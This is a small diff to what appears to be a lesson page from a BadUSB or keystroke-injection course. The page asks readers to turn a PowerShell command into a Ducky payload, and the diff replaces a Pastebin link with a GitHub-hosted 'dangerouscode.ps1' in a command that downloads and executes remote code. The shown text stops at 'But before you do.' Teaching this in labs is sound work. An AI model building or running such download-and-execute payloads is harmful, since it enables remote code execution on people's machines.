@@ -7,7 +7,7 @@ nav_order: 50
 In our labs, we sent data to Pastebin/Github. But what if we used those platforms to host our malicious code?!
 Duckify this powershell command:
 ```powershell
-iex((iwr http://pastebin.com/raw.php?i=sWacjDpa).content)
+iex((iwr https://raw.githubusercontent.com/kenvb/badusb/refs/heads/main/docs/dangerouscode.ps1).content)
 ```
 But before you do. 
 
